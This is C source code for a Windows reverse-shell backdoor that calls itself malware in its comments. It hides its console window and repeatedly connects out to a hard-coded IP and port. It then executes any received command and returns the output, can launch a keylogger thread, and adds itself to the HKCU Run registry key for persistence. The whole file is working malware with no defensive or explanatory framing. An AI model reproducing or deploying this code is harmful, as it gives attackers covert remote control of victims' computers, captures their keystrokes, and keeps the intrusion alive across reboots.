#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include "keylogger.h"
#define bzero(p,size) (void) memset((p), 0 , (size))

//Global Values
int sock;

//Function lists
int bootRun()
{
	char suc[128]="[+] Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVerion\\Run\n";
	TCHAR szPath[MAX_PATH];// TCHAR is kind of Windows 32 character String , MAX_PATH length limitation on Windows
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); // Get full Path of the Module (the Malware)
	if (pathLen==0) //Check Error 
	{
		char err1[128]="[-] Failed To Get Path Of Module";
		send(sock, err1,sizeof(err1),0);
		return -1;
	}

	HKEY NewVal ; //handle to an open Registry Key
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) //Tries to open a new Registry and add a New Value to it
	{		
		char err2[128]="[-] Failed To Add New Registry Key";
		send(sock, err2,sizeof(err2),0);
		return -2;
	}

	DWORD pathLenInBytes = pathLen*sizeof(*szPath); // Need to pass the length of the path string in bytes which may not equal the number of characters due to character set.
	if ((RegSetValueEx(NewVal,TEXT("The Question Is : WhoKilledDB ?"),0,REG_SZ,(LPBYTE)szPath,pathLenInBytes)) != ERROR_SUCCESS) //Change TEXT("") To whatever you want, REG_SZ is the default Key-type , LPBYTE :  pointer to a BYTE
	{
		RegCloseKey(NewVal); //Close the Key
		char err3[128]="[-] Failed To Define Registry Key";
		send(sock, err3,sizeof(err3),0);
		return -3;
	}
	RegCloseKey(NewVal); //Close the Key
	send(sock, suc,sizeof(suc),0);
	return 1;
}



char *
str_cut(char str[], int slice_from, int slice_to)
	{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}


void Shell()
{
	char buffer[1024]; // recv command
	char container[1024]; // store output chunk
	char total_response[18384]; // store total output

	while (1)
	{
		jump:
		bzero(buffer,sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer),0);
		if (strncmp("quit",buffer,4) ==0 )
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if (strncmp("cd ",buffer,3) ==0 )
		{
			chdir(str_cut(buffer,3,100));
		}
		else if (strncmp("keylog",buffer,6) ==0 )
		{
			HANDLE thread = CreateThread(NULL,0,logg,NULL,0, NULL);
			goto jump;
		}
		else if (strncmp("persist",buffer,7) == 0 )
		{
			bootRun();
		}
		else 
		{
			FILE *fp; //Create File Descriptor
			fp = _popen(buffer,"r"); //read command from buffer and execute it
			while (fgets(container,sizeof(container),fp)!=NULL) // while there's more data inside file descriptor
			{
				strcat(total_response,container); //add output to total container
			}
			send(sock,total_response,sizeof(total_response),0);
			fclose(fp);
		}
	}
}

/*This function serves as an entry point for WinAPI 
hInstace : Handle to an instance/module. Used to identify executables by the OS when loaded in memory. It is also needed by some windows functions.
hPrev : Used originally in 16 bit Windows. It's usually zero nowadays.
lpCmdLine : Contains Command line arguments
nCmdShow : Flag which determines window appearance(Minimized/Maximized/Normal)*/

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev , LPSTR lpCmdLine, int nCmdShow)
{
	//Hide Window
	HWND stealth; //stealth handle to make windows invisible
	AllocConsole(); //Allocate new console to the calling process
	stealth = FindWindowA("ConsoleWindowClass",NULL); //FindWindowA() returns a window handle (HWND) to the window that has the specified class name and window name. Here it is used while omitting the name (second argument) and specifying only the class, for which only a single window could exist in this case of a console window, the class of which is "ConsoleWindowClass"
	ShowWindow(stealth,0); //Hide Window. The second parameter(0) is analogus to nCmdShow.

	//Create Socket Objects For backdoor
	struct sockaddr_in ServAddr; //Socket Object
	unsigned short ServPort; //Server Port
	char *ServIP; //Pointer to address containing IP
	WSADATA wsaDATA; //Structure which contains information about Windows sockets

	ServIP = "192.168.56.1"; //IP : Change This
	ServPort = 8888; //Port : Change This
	if (WSAStartup(MAKEWORD(2,0), &wsaDATA) != 0) // The WSAStartup function initiates use of the Winsock DLL by a process.MAKEWORD(2,0) requests  for version 2.2 of Winsock on the system, and sets the passed version as the highest version of Windows Sockets support that the caller can use. The WSAStartup function returns 0 if successful else not
	{
		exit(1);
	}

	//Define Socket Object
	sock = socket(AF_INET,SOCK_STREAM,0); //Aah! I already miss python
	memset(&ServAddr,0, sizeof(ServAddr)); //Clears Memory
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //Convert String to IP-type values
	ServAddr.sin_port = htons(ServPort); //The htons() function converts the unsigned short integer hostshort from host byte order to network byte order

	//Attempt a connection Every 10 seconds
	while (connect(sock,(struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
	}

	/*
	MessageBox(NULL, TEXT("HACKED"), TEXT("Oops !"),MB_OK| MB_ICONERROR); // Prompt
	*/

	//Execute Commands
	Shell();

}
